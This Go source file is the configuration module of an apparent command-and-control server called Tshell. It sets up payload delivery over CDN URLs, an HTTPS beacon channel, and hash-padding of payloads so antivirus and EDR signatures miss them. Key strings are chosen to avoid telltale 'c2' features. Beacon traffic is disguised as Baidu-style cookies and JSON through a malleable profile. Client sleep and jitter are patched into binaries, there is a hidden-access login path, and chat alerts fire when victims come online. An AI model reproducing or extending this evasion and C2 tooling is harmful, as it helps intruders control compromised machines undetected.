package config

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"sync"
	"time"

	"BackendTemplate/pkg/security"

	"gopkg.in/yaml.v3"
	"BackendTemplate/pkg/utils/logx"
)

// Config 应用配置结构体
type Config struct {
	// 应用配置
	Application ApplicationConfig `json:"application" yaml:"application" env:"APPLICATION"`

	// 服务器配置
	Server ServerConfig `json:"server" yaml:"server" env:"SERVER"`

	// 数据库配置
	Database DatabaseConfig `json:"database" yaml:"database" env:"DATABASE"`

	// JWT配置
	JWT JWTConfig `json:"jwt" yaml:"jwt" env:"JWT"`

	// 日志配置
	Logging LoggingConfig `json:"logging" yaml:"logging" env:"LOGGING"`

	// 客户端默认配置（心跳间隔/抖动，监听器未指定时使用）
	Client ClientConfig `json:"client" yaml:"client" env:"CLIENT"`

	// 安全配置
	Security SecurityConfig `json:"security" yaml:"security" env:"SECURITY"`

	// 连接池配置
	ConnectionPool ConnectionPoolConfig `json:"connection_pool" yaml:"connection_pool" env:"CONNECTION_POOL"`

	// 工作池配置
	WorkerPool WorkerPoolConfig `json:"worker_pool" yaml:"worker_pool" env:"WORKER_POOL"`

	// 认证配置
	Auth AuthConfig `json:"auth" yaml:"auth" env:"AUTH"`

	// HTTP配置（保持兼容性）
	HTTP HTTPConfig `json:"http" yaml:"http" env:"HTTP"`

	// 通知配置
	Notifications NotificationConfig `json:"notifications" yaml:"notifications" env:"NOTIFICATIONS"`

	// 载荷投递 / CDN 公开地址默认配置
	Delivery DeliveryConfig `json:"delivery" yaml:"delivery" env:"DELIVERY"`

	// HTTPS 监听器 TLS 证书配置（C2 beacon 信道；留空则监听器启动时自签兜底）
	HTTPS HTTPSConfig `json:"https" yaml:"https" env:"HTTPS"`

	// 载荷混淆配置（二进制特征规避）
	Obfuscation ObfuscationConfig `json:"obfuscation" yaml:"obfuscation" env:"OBFUSCATION"`
}

// ObfuscationConfig 载荷混淆配置（OPSEC：二进制特征规避）
type ObfuscationConfig struct {
	// HashPad 二进制 Hash 轮换：生成载荷时追加随机填充字节，每份载荷 hash 唯一化
	// （规避"同一模板 hash 固定被 AV/EDR 静态标记"）。默认开启。
	HashPad bool `json:"hash_pad" yaml:"hash_pad" env:"HASH_PAD" default:"true"`
}

// HTTPSConfig HTTPS 监听器证书配置
type HTTPSConfig struct {
	CertFile string `json:"cert_file" yaml:"cert_file" env:"CERT_FILE" default:""`
	KeyFile  string `json:"key_file"  yaml:"key_file"  env:"KEY_FILE"  default:""`
}

// ServerConfig 服务器配置
type ServerConfig struct {
	Host         string        `json:"host" yaml:"host" env:"HOST" default:"0.0.0.0"`
	Port         int           `json:"port" yaml:"port" env:"PORT" default:"8089"`
	Mode         string        `json:"mode" yaml:"mode" env:"MODE" default:"release"`
	ReadTimeout  time.Duration `json:"read_timeout" yaml:"read_timeout" env:"READ_TIMEOUT" default:"30s"`
	WriteTimeout time.Duration `json:"write_timeout" yaml:"write_timeout" env:"WRITE_TIMEOUT" default:"30s"`
	IdleTimeout  time.Duration `json:"idle_timeout" yaml:"idle_timeout" env:"IDLE_TIMEOUT" default:"60s"`
	ExternalIP   string        `json:"external_ip" yaml:"external_ip" env:"EXTERNAL_IP" default:""`
	AutoDetectIP bool          `json:"auto_detect_ip" yaml:"auto_detect_ip" env:"AUTO_DETECT_IP" default:"true"`
}

// DatabaseConfig 数据库配置
type DatabaseConfig struct {
	Type         string        `json:"type" yaml:"type" env:"TYPE" default:"sqlite3"`
	Path         string        `json:"path" yaml:"path" env:"PATH" default:"./database.db"`
	MaxOpenConns int           `json:"max_open_conns" yaml:"max_open_conns" env:"MAX_OPEN_CONNS" default:"25"`
	MaxIdleConns int           `json:"max_idle_conns" yaml:"max_idle_conns" env:"MAX_IDLE_CONNS" default:"5"`
	MaxLifetime  time.Duration `json:"max_lifetime" yaml:"max_lifetime" env:"MAX_LIFETIME" default:"5m"`
}

// JWTConfig JWT配置
type JWTConfig struct {
	SecretKeyFile   string        `json:"secret_key_file" yaml:"secret_key_file" env:"SECRET_KEY_FILE" default:"./jwt_key.hex"`
	AccessTokenTTL  time.Duration `json:"access_token_ttl" yaml:"access_token_ttl" env:"ACCESS_TOKEN_TTL" default:"15m"`
	RefreshTokenTTL time.Duration `json:"refresh_token_ttl" yaml:"refresh_token_ttl" env:"REFRESH_TOKEN_TTL" default:"168h"`
	MaxRefreshCount int           `json:"max_refresh_count" yaml:"max_refresh_count" env:"MAX_REFRESH_COUNT" default:"100"`
	Algorithm       string        `json:"algorithm" yaml:"algorithm" env:"ALGORITHM" default:"HS256"`
}

// LoggingConfig 日志配置
type LoggingConfig struct {
	Level         string `json:"level" yaml:"level" env:"LEVEL" default:"info"`
	Format        string `json:"format" yaml:"format" env:"FORMAT" default:"json"`
	Output        string `json:"output" yaml:"output" env:"OUTPUT" default:"stdout"`
	AuditLogDir   string `json:"audit_log_dir" yaml:"audit_log_dir" env:"AUDIT_LOG_DIR" default:"./logs"`
	MaxFileSize   int64  `json:"max_file_size" yaml:"max_file_size" env:"MAX_FILE_SIZE" default:"104857600"`
	MaxRetainDays int    `json:"max_retain_days" yaml:"max_retain_days" env:"MAX_RETAIN_DAYS" default:"30"`
	EnableConsole bool   `json:"enable_console" yaml:"enable_console" env:"ENABLE_CONSOLE" default:"true"`
}

// SecurityConfig 安全配置
type SecurityConfig struct {
	EnableRateLimit   bool          `json:"enable_rate_limit" yaml:"enable_rate_limit" env:"ENABLE_RATE_LIMIT" default:"true"`
	LoginRateLimit    int           `json:"login_rate_limit" yaml:"login_rate_limit" env:"LOGIN_RATE_LIMIT" default:"5"`
	APIRateLimit      int           `json:"api_rate_limit" yaml:"api_rate_limit" env:"API_RATE_LIMIT" default:"100"`
	BlockDuration     time.Duration `json:"block_duration" yaml:"block_duration" env:"BLOCK_DURATION" default:"15m"`
	SlidingWindow     time.Duration `json:"sliding_window" yaml:"sliding_window" env:"SLIDING_WINDOW" default:"1m"`
	MaxLoginAttempts  int           `json:"max_login_attempts" yaml:"max_login_attempts" env:"MAX_LOGIN_ATTEMPTS" default:"5"`
	EnableIPWhitelist bool          `json:"enable_ip_whitelist" yaml:"enable_ip_whitelist" env:"ENABLE_IP_WHITELIST" default:"false"`
	WhitelistIPs      []string      `json:"whitelist_ips" yaml:"whitelist_ips" env:"WHITELIST_IPS"`
	// SessionKeyInfo 会话密钥派生盐上下文(客户端生成时 patch 进二进制;修改后需重新生成客户端;
	// 默认中性随机串,不带 c2/key/session 等明显特征)
	SessionKeyInfo string `json:"session_key_info" yaml:"session_key_info" env:"SESSION_KEY_INFO" default:"8d2c91f4a6"`
}

// ConnectionPoolConfig 连接池配置
type ConnectionPoolConfig struct {
	MaxConnections    int           `json:"max_connections" yaml:"max_connections" env:"MAX_CONNECTIONS" default:"1000"`
	MaxIdleTime       time.Duration `json:"max_idle_time" yaml:"max_idle_time" env:"MAX_IDLE_TIME" default:"30m"`
	HealthCheckPeriod time.Duration `json:"health_check_period" yaml:"health_check_period" env:"HEALTH_CHECK_PERIOD" default:"30s"`
	ConnTimeout       time.Duration `json:"conn_timeout" yaml:"conn_timeout" env:"CONN_TIMEOUT" default:"10s"`
	ReadTimeout       time.Duration `json:"read_timeout" yaml:"read_timeout" env:"READ_TIMEOUT" default:"30s"`
	WriteTimeout      time.Duration `json:"write_timeout" yaml:"write_timeout" env:"WRITE_TIMEOUT" default:"30s"`
}

// WorkerPoolConfig 工作池配置
type WorkerPoolConfig struct {
	WorkerCount   int  `json:"worker_count" yaml:"worker_count" env:"WORKER_COUNT" default:"0"`
	MaxQueueSize  int  `json:"max_queue_size" yaml:"max_queue_size" env:"MAX_QUEUE_SIZE" default:"0"`
	EnableMetrics bool `json:"enable_metrics" yaml:"enable_metrics" env:"ENABLE_METRICS" default:"true"`
}

// AuthConfig 认证配置
type AuthConfig struct {
	DefaultUsername     string             `json:"default_username" yaml:"default_username" env:"DEFAULT_USERNAME" default:"admin"`
	DefaultPassword     string             `json:"default_password" yaml:"default_password" env:"DEFAULT_PASSWORD" default:"admin123"`
	ForceChangePassword bool               `json:"force_change_password" yaml:"force_change_password" env:"FORCE_CHANGE_PASSWORD" default:"false"`
	HiddenAccessKey     string             `json:"hidden_access_key" yaml:"hidden_access_key" env:"HIDDEN_ACCESS_KEY" default:""`
	EnableHiddenAccess  bool               `json:"enable_hidden_access" yaml:"enable_hidden_access" env:"ENABLE_HIDDEN_ACCESS" default:"false"`
	HiddenAccessConfig  HiddenAccessConfig `json:"hidden_access_config" yaml:"hidden_access_config"`
}

// ApplicationConfig 应用配置
type ApplicationConfig struct {
	Name    string `json:"name" yaml:"name" env:"APP_NAME" default:"Tshell"`
	Version string `json:"version" yaml:"version" env:"APP_VERSION" default:"4.9.3"`
	Author  string `json:"author" yaml:"author" env:"APP_AUTHOR" default:"Tshell Team"`
}

// HiddenAccessConfig 隐藏访问配置
type HiddenAccessConfig struct {
	// 支持的访问路径列表，例如：["/", "/pass", "/login"]
	AccessPaths []string `json:"access_paths" yaml:"access_paths" default:"[\"/\"]"`
	// 支持的参数名列表，例如：["key", "pass", "token"]
	ParamNames []string `json:"param_names" yaml:"param_names" default:"[\"key\"]"`
	// 访问密钥值
	SecretKey string `json:"secret_key" yaml:"secret_key" default:""`
	// 会话有效期（小时）
	SessionTTL int `json:"session_ttl" yaml:"session_ttl" default:"2"`
}

// HTTPConfig HTTP协议配置（保持兼容性）
type HTTPConfig struct {
	GetMetadataPrepend        string `json:"get_metadata_prepend" yaml:"get_metadata_prepend" env:"GET_METADATA_PREPEND"`
	GetOutputPrepend          string `json:"get_output_prepend" yaml:"get_output_prepend" env:"GET_OUTPUT_PREPEND"`
	GetOutputAppend           string `json:"get_output_append" yaml:"get_output_append" env:"GET_OUTPUT_APPEND"`
	PostIDPrepend             string `json:"post_id_prepend" yaml:"post_id_prepend" env:"POST_ID_PREPEND"`
	PostIDAppend              string `json:"post_id_append" yaml:"post_id_append" env:"POST_ID_APPEND"`
	PostClientOutputPrepend   string `json:"post_client_output_prepend" yaml:"post_client_output_prepend" env:"POST_CLIENT_OUTPUT_PREPEND"`
	PostClientOutputAppend    string `json:"post_client_output_append" yaml:"post_client_output_append" env:"POST_CLIENT_OUTPUT_APPEND"`
	PostClientOutputType      string `json:"post_client_output_type" yaml:"post_client_output_type" env:"POST_CLIENT_OUTPUT_TYPE"`
	PostClientOutputTypeValue string `json:"post_client_output_type_value" yaml:"post_client_output_type_value" env:"POST_CLIENT_OUTPUT_TYPE_VALUE"`
	PostServerOutputPrepend   string `json:"post_server_output_prepend" yaml:"post_server_output_prepend" env:"POST_SERVER_OUTPUT_PREPEND"`
	PostServerOutputAppend    string `json:"post_server_output_append" yaml:"post_server_output_append" env:"POST_SERVER_OUTPUT_APPEND"`

	// 批量命令下发(轮询协议单轮 GET/TXT 只拉 1 条命令,批量任务时每条一个 RTT 极慢)。
	// 开启后:仅对上报 b1 能力标记(MetaInfo 第 6 段)的新客户端以 CMD_BATCH 帧打包
	// 多条命令;旧客户端永远单条,零行为变化。默认关闭,灰度后开启;出问题改配置即回退。
	BatchCommands bool `json:"batch_commands" yaml:"batch_commands" default:"false"`
}

// NotificationConfig 通知配置
type NotificationConfig struct {
	// 第三方通知平台配置
	DingTalk DingTalkConfig `json:"dingtalk" yaml:"dingtalk"`
	Wecom    WecomConfig    `json:"wecom" yaml:"wecom"`
	Feishu   FeishuConfig   `json:"feishu" yaml:"feishu"`

	// 通知功能开关
	Enable      bool `json:"enable" yaml:"enable" default:"false"`
	EnableAudio bool `json:"enable_audio" yaml:"enable_audio" default:"false"`
}

// DingTalkConfig 钉钉配置
type DingTalkConfig struct {
	Enable  bool   `json:"enable" yaml:"enable" default:"false"`
	Token   string `json:"token" yaml:"token"`
	Keyword string `json:"keyword" yaml:"keyword" default:"上线"`
	Secret  string `json:"secret" yaml:"secret"`
}

// WecomConfig 企业微信配置
type WecomConfig struct {
	Enable bool   `json:"enable" yaml:"enable" default:"false"`
	WxKey  string `json:"wx_key" yaml:"wx_key"`
}

// FeishuConfig 飞书配置
type FeishuConfig struct {
	Enable  bool   `json:"enable" yaml:"enable" default:"false"`
	Webhook string `json:"webhook" yaml:"webhook"`
	Secret  string `json:"secret" yaml:"secret"`
	Keyword string `json:"keyword" yaml:"keyword" default:"上线"`
}

// DeliveryConfig 载荷投递公开地址默认（为 CDN / 域名 / HTTPS 预留）
// 单条 WebDelivery 可覆盖这些默认；空字段表示使用本配置或自动推断。
type DeliveryConfig struct {
	// 默认 scheme：http | https（CDN 通常 https）
	DefaultScheme string `json:"default_scheme" yaml:"default_scheme" env:"DEFAULT_SCHEME" default:"http"`
	// 默认对外域名或 IP:Port（如 cdn.example.com 或 1.2.3.4:8089），不含 scheme
	DefaultHost string `json:"default_host" yaml:"default_host" env:"DEFAULT_HOST" default:""`
	// 路径前缀，如 /static 或空；最终 URL: {scheme}://{host}{base_path}/d/{key}/...
	BasePath string `json:"base_path" yaml:"base_path" env:"BASE_PATH" default:""`
	// 强制 https（忽略 http）；适合全站 CDN HTTPS
	ForceHTTPS bool `json:"force_https" yaml:"force_https" env:"FORCE_HTTPS" default:"false"`
	// 对外不带端口（443/80 由 CDN 终结时常用）
	OmitDefaultPort bool `json:"omit_default_port" yaml:"omit_default_port" env:"OMIT_DEFAULT_PORT" default:"true"`
	// CDN 边缘缓存秒数提示（Cache-Control max-age）；0=no-store
	CacheMaxAge int `json:"cache_max_age" yaml:"cache_max_age" env:"CACHE_MAX_AGE" default:"0"`
	// 允许的 CORS Origin（CDN 回源或浏览器拉取）；空=不设 CORS；* 允许任意
	CORSAllowOrigin string `json:"cors_allow_origin" yaml:"cors_allow_origin" env:"CORS_ALLOW_ORIGIN" default:""`
	// 信任的反代头（X-Forwarded-Proto / X-Forwarded-Host）用于日志与可选 URL 推断
	TrustProxyHeaders bool `json:"trust_proxy_headers" yaml:"trust_proxy_headers" env:"TRUST_PROXY_HEADERS" default:"true"`
}

// ConfigManager 配置管理器
type ConfigManager struct {
	config      *Config
	configFile  string
	mu          sync.RWMutex
	watchers    []chan struct{}
	lastModTime time.Time
}

// 全局配置管理器实例
var GlobalConfig *ConfigManager

// LoadConfig 加载配置
func LoadConfig(configFile string) (*ConfigManager, error) {
	manager := &ConfigManager{
		configFile: configFile,
		config:     &Config{},
	}

	// 加载配置
	if err := manager.loadConfig(); err != nil {
		return nil, fmt.Errorf("加载配置失败: %v", err)
	}

	// 启动配置监听
	go manager.watchConfig()

	return manager, nil
}

// loadConfig 加载配置文件
func (cm *ConfigManager) loadConfig() error {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	// 创建默认配置
	cm.config = createDefaultConfig()

	// 检查配置文件是否存在
	if _, err := os.Stat(cm.configFile); os.IsNotExist(err) {
		logx.Infof("配置文件不存在，使用默认配置并创建配置文件: %s\n", cm.configFile)
		return cm.saveConfig()
	}

	// 读取配置文件
	data, err := ioutil.ReadFile(cm.configFile)
	if err != nil {
		return fmt.Errorf("读取配置文件失败: %v", err)
	}

	// 根据文件扩展名选择解析方式
	ext := strings.ToLower(filepath.Ext(cm.configFile))
	switch ext {
	case ".json":
		err = json.Unmarshal(data, cm.config)
	case ".yaml", ".yml":
		err = yaml.Unmarshal(data, cm.config)
	default:
		return fmt.Errorf("不支持的配置文件格式: %s", ext)
	}

	if err != nil {
		// 常见故障排查提示: 该错误多为配置文件被非 UTF-8 编辑器保存导致
		// (编码损坏/换行丢失),或缩进/结构错误——原报错"invalid trailing UTF-8
		// octet"等过于晦涩。参考 config.example.yaml 重建可快速恢复。
		hint := ""
		if strings.Contains(err.Error(), "UTF-8") || strings.Contains(err.Error(), "utf-8") {
			hint = "(文件含无效 UTF-8 字节,多为此前用非 UTF-8 编辑器保存所致;请转存为 UTF-8 或参照 config.example.yaml 重建)"
		} else if strings.Contains(err.Error(), "did not find expected key") || strings.Contains(err.Error(), "mapping values") {
			hint = "(疑似缩进或换行结构损坏;可参照 config.example.yaml 对照修复)"
		}
		return fmt.Errorf("解析配置文件失败: %v %s", err, hint)
	}

	// 覆盖环境变量
	if err := cm.loadEnvironmentVariables(); err != nil {
		return fmt.Errorf("加载环境变量失败: %v", err)
	}

	// 验证配置
	if err := cm.validateConfig(); err != nil {
		return fmt.Errorf("配置验证失败: %v", err)
	}

	// 获取文件修改时间
	if stat, err := os.Stat(cm.configFile); err == nil {
		cm.lastModTime = stat.ModTime()
	}

	logx.Infof("配置加载成功: %s\n", cm.configFile)
	return nil
}

// saveConfig 保存配置到文件
func (cm *ConfigManager) saveConfig() error {
	// 确保目录存在
	dir := filepath.Dir(cm.configFile)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	// 根据文件扩展名选择保存格式
	ext := strings.ToLower(filepath.Ext(cm.configFile))
	var data []byte
	var err error

	switch ext {
	case ".json":
		data, err = json.MarshalIndent(cm.config, "", "  ")
	case ".yaml", ".yml":
		data, err = yaml.Marshal(cm.config)
	default:
		return fmt.Errorf("不支持的配置文件格式: %s", ext)
	}

	if err != nil {
		return err
	}

	return ioutil.WriteFile(cm.configFile, data, 0600) // 含密钥的配置文件仅属主可读写
}

// createDefaultConfig 创建默认配置
func createDefaultConfig() *Config {
	config := &Config{}

	// 使用反射设置默认值
	setDefaultValues(reflect.ValueOf(config).Elem())

	// 设置HTTP配置默认值（保持兼容性）
	config.HTTP = HTTPConfig{
		GetMetadataPrepend:        "BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;SESSIONID=",
		GetOutputPrepend:          "{\"data\":{\"log_id\":\"3796460674\",\"action_rule\":{\"pos_1\":[\"]",
		GetOutputAppend:           "%%\"],\"pos_2\":[],\"pos_3\":[]}}",
		PostIDPrepend:             "BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;user=",
		PostIDAppend:              "%%; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE",
		PostClientOutputPrepend:   "{\"data\":{\"log_id\":\"3796460677\",\"action_rule\":{\"pos_1\":[],\"pos_2\":[\"]",
		PostClientOutputAppend:    "%%\"],\"pos_3\":[]}}",
		PostClientOutputType:      "print",
		PostClientOutputTypeValue: "_data",
		PostServerOutputPrepend:   "{\"data\":{\"log_id\":\"3796460679\",\"action_rule\":{\"pos_1\":[],\"pos_2\":[],\"pos_3\":[\"]",
		PostServerOutputAppend:    "%%\"]}}",
	}

	return config
}

// setDefaultValues 使用反射设置默认值
func setDefaultValues(v reflect.Value) {
	for i := 0; i < v.NumField(); i++ {
		field := v.Field(i)
		fieldType := v.Type().Field(i)

		if field.Kind() == reflect.Struct {
			setDefaultValues(field)
			continue
		}

		// 获取默认值标签
		defaultValue := fieldType.Tag.Get("default")
		if defaultValue == "" {
			continue
		}

		// 根据字段类型设置默认值
		switch field.Kind() {
		case reflect.String:
			field.SetString(defaultValue)
		case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:
			if field.Type() == reflect.TypeOf(time.Duration(0)) {
				// 处理时间持续类型
				if duration, err := time.ParseDuration(defaultValue); err == nil {
					field.SetInt(int64(duration))
				}
			} else {
				// 处理整数类型
				if intValue, err := strconv.ParseInt(defaultValue, 10, 64); err == nil {
					field.SetInt(intValue)
				}
			}
		case reflect.Bool:
			if boolValue, err := strconv.ParseBool(defaultValue); err == nil {
				field.SetBool(boolValue)
			}
		case reflect.Slice:
			// 处理切片类型（如字符串数组）
			if field.Type().Elem().Kind() == reflect.String {
				values := strings.Split(defaultValue, ",")
				slice := reflect.MakeSlice(field.Type(), len(values), len(values))
				for j, value := range values {
					slice.Index(j).SetString(strings.TrimSpace(value))
				}
				field.Set(slice)
			}
		}
	}
}

// loadEnvironmentVariables 加载环境变量
func (cm *ConfigManager) loadEnvironmentVariables() error {
	return loadEnvVariables(reflect.ValueOf(cm.config).Elem(), "TSHELL")
}

// loadEnvVariables 递归加载环境变量
func loadEnvVariables(v reflect.Value, prefix string) error {
	for i := 0; i < v.NumField(); i++ {
		field := v.Field(i)
		fieldType := v.Type().Field(i)

		// 构建环境变量名
		envName := prefix + "_" + strings.ToUpper(fieldType.Name)
		if envTag := fieldType.Tag.Get("env"); envTag != "" {
			envName = prefix + "_" + envTag
		}

		if field.Kind() == reflect.Struct {
			// 递归处理嵌套结构体
			if err := loadEnvVariables(field, envName); err != nil {
				return err
			}
			continue
		}

		// 获取环境变量值
		envValue := os.Getenv(envName)
		if envValue == "" {
			continue
		}

		// 设置字段值
		if err := setFieldValue(field, envValue); err != nil {
			return fmt.Errorf("设置环境变量 %s 失败: %v", envName, err)
		}
	}

	return nil
}

// setFieldValue 设置字段值
func setFieldValue(field reflect.Value, value string) error {
	switch field.Kind() {
	case reflect.String:
		field.SetString(value)
	case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:
		if field.Type() == reflect.TypeOf(time.Duration(0)) {
			duration, err := time.ParseDuration(value)
			if err != nil {
				return err
			}
			field.SetInt(int64(duration))
		} else {
			intValue, err := strconv.ParseInt(value, 10, 64)
			if err != nil {
				return err
			}
			field.SetInt(intValue)
		}
	case reflect.Bool:
		boolValue, err := strconv.ParseBool(value)
		if err != nil {
			return err
		}
		field.SetBool(boolValue)
	case reflect.Slice:
		if field.Type().Elem().Kind() == reflect.String {
			values := strings.Split(value, ",")
			slice := reflect.MakeSlice(field.Type(), len(values), len(values))
			for i, v := range values {
				slice.Index(i).SetString(strings.TrimSpace(v))
			}
			field.Set(slice)
		}
	default:
		return fmt.Errorf("不支持的字段类型: %v", field.Kind())
	}

	return nil
}

// validateConfig 验证配置
func (cm *ConfigManager) validateConfig() error {
	config := cm.config

	// 验证服务器配置
	if config.Server.Port < 1 || config.Server.Port > 65535 {
		return fmt.Errorf("服务器端口必须在1-65535之间")
	}

	// 验证数据库配置
	if config.Database.Type == "" {
		return fmt.Errorf("数据库类型不能为空")
	}

	// 验证JWT配置
	if config.JWT.AccessTokenTTL <= 0 {
		return fmt.Errorf("访问令牌有效期必须大于0")
	}
	if config.JWT.RefreshTokenTTL <= 0 {
		return fmt.Errorf("刷新令牌有效期必须大于0")
	}

	// 验证安全配置
	if config.Security.LoginRateLimit <= 0 {
		return fmt.Errorf("登录速率限制必须大于0")
	}
	if config.Security.APIRateLimit <= 0 {
		return fmt.Errorf("API速率限制必须大于0")
	}

	return nil
}

// watchConfig 监听配置文件变化
func (cm *ConfigManager) watchConfig() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		stat, err := os.Stat(cm.configFile)
		if err != nil {
			continue
		}

		if stat.ModTime().After(cm.lastModTime) {
			logx.Println("🔄 检测到配置文件变化，重新加载配置...")

			if err := cm.loadConfig(); err != nil {
				logx.Errorf("❌ 重新加载配置失败: %v\n", err)
			} else {
				logx.Println("✅ 配置重新加载成功")

				// 获取新配置
				newConfig := cm.GetConfig()

				// 检查用户认证配置是否变化
				if GlobalUserManager != nil {
					err := GlobalUserManager.OnConfigChanged(newConfig)
					if err != nil {
						logx.Warnf("⚠️ 用户认证配置更新失败: %v\n", err)
					}
				}

				// 通知所有监听者
				cm.notifyWatchers()
			}
		}
	}
}

// notifyWatchers 通知配置变化监听者
func (cm *ConfigManager) notifyWatchers() {
	cm.mu.RLock()
	defer cm.mu.RUnlock()

	for _, watcher := range cm.watchers {
		select {
		case watcher <- struct{}{}:
		default:
		}
	}
}

// Watch 监听配置变化
func (cm *ConfigManager) Watch() <-chan struct{} {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	watcher := make(chan struct{}, 1)
	cm.watchers = append(cm.watchers, watcher)
	return watcher
}

// GetConfig 获取配置
func (cm *ConfigManager) GetConfig() *Config {
	cm.mu.RLock()
	defer cm.mu.RUnlock()

	// 返回配置的深拷贝
	configData, _ := json.Marshal(cm.config)
	var configCopy Config
	json.Unmarshal(configData, &configCopy)
	return &configCopy
}

// UpdateConfig 更新配置
func (cm *ConfigManager) UpdateConfig(updateFunc func(*Config) error) error {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	// 创建配置副本
	configData, _ := json.Marshal(cm.config)
	var configCopy Config
	json.Unmarshal(configData, &configCopy)

	// 执行更新
	if err := updateFunc(&configCopy); err != nil {
		return err
	}

	// 验证更新后的配置
	tempManager := &ConfigManager{config: &configCopy}
	if err := tempManager.validateConfig(); err != nil {
		return err
	}

	// 应用更新
	cm.config = &configCopy

	// 保存到文件
	if err := cm.saveConfig(); err != nil {
		return fmt.Errorf("保存配置文件失败: %v", err)
	}

	return nil
}

// InitGlobalConfig 初始化全局配置
func InitGlobalConfig(configFile string) error {
	var err error
	GlobalConfig, err = LoadConfig(configFile)
	if err != nil {
		return fmt.Errorf("初始化全局配置失败: %v", err)
	}

	// 设置全局配置获取器，避免循环导入
	security.GlobalConfigGetter = GlobalConfig

	// 注入隐藏访问配置持久化回调，避免 security -> config 循环导入
	security.HiddenAccessConfigPersister = func(enabled bool, accessPaths, paramNames []string, secretKey string, sessionTTL int) error {
		return GlobalConfig.UpdateConfig(func(cfg *Config) error {
			cfg.Auth.EnableHiddenAccess = enabled
			cfg.Auth.HiddenAccessKey = secretKey
			cfg.Auth.HiddenAccessConfig.AccessPaths = accessPaths
			cfg.Auth.HiddenAccessConfig.ParamNames = paramNames
			cfg.Auth.HiddenAccessConfig.SecretKey = secretKey
			cfg.Auth.HiddenAccessConfig.SessionTTL = sessionTTL
			return nil
		})
	}

	// 应用 HTTP masquerade（malleable C2 profile，config.yaml http 段）到包级变量
	ApplyHTTPConfig(GetGlobalConfig().HTTP)

	logx.Infof("✅ 全局配置初始化成功: %s\n", configFile)
	return nil
}

// GetGlobalConfig 获取全局配置
func GetGlobalConfig() *Config {
	if GlobalConfig == nil {
		return createDefaultConfig()
	}
	return GlobalConfig.GetConfig()
}

// GetLogLevel 实现security.ConfigGetter接口
func (cm *ConfigManager) GetLogLevel() string {
	cm.mu.RLock()
	defer cm.mu.RUnlock()
	return cm.config.Logging.Level
}

// ClientConfig 客户端默认配置（服务端生成/监听器默认值时使用）
type ClientConfig struct {
	// 默认心跳间隔（秒）：客户端回连/休眠间隔，监听器未配置时使用
	Sleep int `json:"sleep" yaml:"sleep" env:"CLIENT_SLEEP" default:"5"`
	// 默认抖动百分比（0-50）：心跳间隔的随机抖动，客户端编译时 patch 使用
	Jitter int `json:"jitter" yaml:"jitter" env:"CLIENT_JITTER" default:"20"`
}
